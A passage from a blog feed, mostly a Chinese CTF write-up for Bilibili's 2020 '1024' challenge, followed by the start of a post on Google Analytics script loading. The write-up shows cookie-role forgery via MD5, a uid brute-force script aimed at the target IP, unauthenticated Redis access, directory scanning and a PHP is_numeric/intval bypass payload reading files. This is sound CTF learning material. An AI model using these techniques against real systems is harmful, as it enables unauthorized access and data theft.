height=\"720\" class=\"lazy post-img\"></p>\n<p>curl 太慢了而且没有代码高亮、直接在地址栏通过 <code>view-source:</code> 看看源码，把 JavaScript 拿出来：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/admin\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            <span class=\"hljs-keyword\">var</span> input = <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"flag1\"</span>);            input.value = <span class=\"hljs-built_in\">String</span>(data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag1'</span>).html(<span class=\"hljs-string\">\"接口异常，请稍后再试～\"</span>);        }    }})</code></pre>\n<p>所以第一题的 Flag 就是 <code>GET /api/admin</code> 了。在页面上 <code>#flag1</code> 元素是被包裹在一个 <code>display: none</code> 的容器里的，不过审查元素或者直接请求访问 API 都能拿到第一题的 Flag。</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-25</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 